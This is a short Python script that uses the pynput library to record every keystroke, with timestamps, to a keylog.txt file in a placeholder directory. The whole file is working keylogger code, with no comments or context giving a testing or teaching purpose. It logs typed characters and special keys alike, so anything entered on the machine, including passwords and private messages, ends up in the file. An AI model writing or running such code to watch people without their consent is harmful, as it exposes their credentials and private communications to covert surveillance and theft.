import pynput
from pynput.keyboard import Key, Listener
import logging

log_dir  = r"Pathname"
logging.basicConfig(filename = (log_dir + r"/keylog.txt"), level = logging.INFO, format = '%(asctime)s: %(message)s')
def on_press(key):
    try:
        logging.info(key.char)
    except AttributeError:
        logging.info(key)

with Listener(on_press = on_press) as listener:
    listener.join() 
